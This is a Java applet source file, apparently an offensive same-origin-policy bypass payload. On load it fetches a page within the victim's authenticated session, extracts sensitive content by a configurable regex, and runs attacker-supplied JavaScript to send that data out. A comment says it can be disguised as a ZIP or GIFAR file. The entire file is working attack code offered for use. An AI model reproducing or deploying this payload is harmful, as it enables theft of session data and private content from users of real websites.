import java.applet.Applet;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import netscape.javascript.JSObject;

public class SopApplet extends Applet {


	@Override
	public void init() {
		//System.out.println("Applet initializing...");
		loadUrlFromVictimServer();
		super.init();
	}

	private void loadUrlFromVictimServer() {
		//System.out.println("PAYLOAD EXECUTING (ACCESS SERVER FROM VICTIM'S BROWSER)");
		//System.out.println("-------------------");
		/* NOTE: This applet can also be packaged as ZIP file with any extension and even as GIFAR file ! */
		String relativeUrlWithinVictimSession = getParameter("payload.relativeUrlWithinVictimSession");
		String regExpOfSenitiveContentForExtraction = getParameter("payload.regExpOfSenitiveContentForExtraction");
		String dataExfiltrationJavaScript = getParameter("payload.dataExfiltrationJavaScript");
		InputStream is = null;
		try {
			URL fileLocation = new URL(getCodeBase().toString() + relativeUrlWithinVictimSession);
			is = fileLocation.openStream();
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader br = new BufferedReader(isr);
			StringBuilder response = new StringBuilder();
			String line;
			while ((line = br.readLine()) != null) {
				//System.out.println(line);
				response.append(line).append("\n");
			}
			Pattern searchPattern = Pattern.compile(regExpOfSenitiveContentForExtraction);
			Matcher matcher = searchPattern.matcher(response.toString());
			//System.out.println("Matcher with pattern: "+regExpOfSenitiveContentForExtraction);
			if (matcher.find()) {
				//System.out.println("RegExp matches");
				String extractedData = matcher.group(1);
				if (extractedData != null && extractedData.length() > 0) {
					//System.out.println("Extracted data: "+extractedData);
					JSObject window = JSObject.getWindow(this);
					window.eval(dataExfiltrationJavaScript.replace("$$$",extractedData));
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
				//System.out.println("-------------------");
			}
		}
	}

	@Override
	public void start() {
		super.start();
	}

	@Override
	public void stop() {
		super.stop();
	}

	@Override
	public void destroy() {
		super.destroy();
	}

}
